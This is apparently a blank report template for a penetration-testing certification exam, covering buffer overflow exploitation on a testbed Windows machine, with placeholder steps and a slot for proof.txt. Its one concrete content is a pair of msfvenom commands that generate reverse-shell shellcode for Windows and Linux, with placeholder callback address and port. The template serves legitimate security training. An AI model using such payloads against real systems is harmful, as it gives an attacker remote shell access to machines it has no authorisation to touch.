### IP: IP - HOSTNAME

#### Buffer Overflow Exploitation

The Exam network has provided a testbed Windows machine (IP: TODO). There is a vulnerable application file located
at `C:\TODO\TODO.exe`. A sample `POC.py` script has been provided.

**Testbed Exploitation Overview:**

NOTE: Files using in this section are attached in the Appendix section.

**Step1: Finding crash-bytes**

**Step2: Finding offset & EIP**

**Step3: Finding badChars**

**Step4: Finding JMP**

**Step5: Generating payload**

1. msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "badChars" -f c
2. [OR]
3. msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "badChars" -f c

**Step6: Prepend NOPs**

**Step7: Test on testbed environment**

**Target Exploitation:**

**proof.txt screenshot:**

![Contents of proof.txt]()

**proof.txt Contents:** `KEY`

\pagebreak